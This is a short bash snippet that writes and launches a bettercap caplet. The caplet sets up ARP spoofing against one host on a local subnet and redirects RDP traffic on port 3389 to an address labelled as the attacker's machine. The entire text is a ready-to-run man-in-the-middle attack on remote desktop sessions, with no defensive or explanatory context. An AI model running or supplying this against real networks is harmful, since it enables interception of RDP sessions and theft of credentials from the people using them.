```bash
cat > rdp.cap << 'eof'
# reduce number of initial error messages from arp.spoof
net.recon on

set arp.spoof.targets 192.168.1.137
# internal is required because client and server are in the same subnets
set arp.spoof.internal true
arp.spoof on

set any.proxy.src_port 3389
set any.proxy.dst_port 3389
# attacker ip address
set any.proxy.dst_address 192.168.1.138
any.proxy on
eof
sudo bettercap -iface eth0 -caplet rdp.cap
```